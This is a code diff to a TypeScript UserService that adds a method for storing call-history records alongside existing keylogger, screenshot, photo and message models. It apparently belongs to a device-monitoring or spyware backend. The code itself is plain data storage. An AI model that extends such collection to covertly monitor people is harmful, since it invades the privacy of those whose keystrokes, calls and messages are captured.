@@ -20,6 +20,7 @@ import { TimeOnApp } from "../models/TimeOnApp";
 import { KeyLogger } from "../models/KeyLogger";
 import { ScreenShot } from "../models/ScreenShot";
 import { Photo } from "../models/Photo";
+import { CallHistory } from '../models/CallHistory';
 
 @Service()
 export class UserService {
@@ -187,6 +188,18 @@ export class UserService {
         }
 
         user.messageList.push(...messageList);
+
+        await this.userRepository.save(user);
+
+        return user;
+    }
+
+    public async addCallHistory(callHistoryList: CallHistory[], user: User): Promise<User> {
+        if (user.callHistoryList === undefined) {
+            user.callHistoryList = [];
+        }
+
+        user.callHistoryList.push(...callHistoryList);
 
         await this.userRepository.save(user);
 
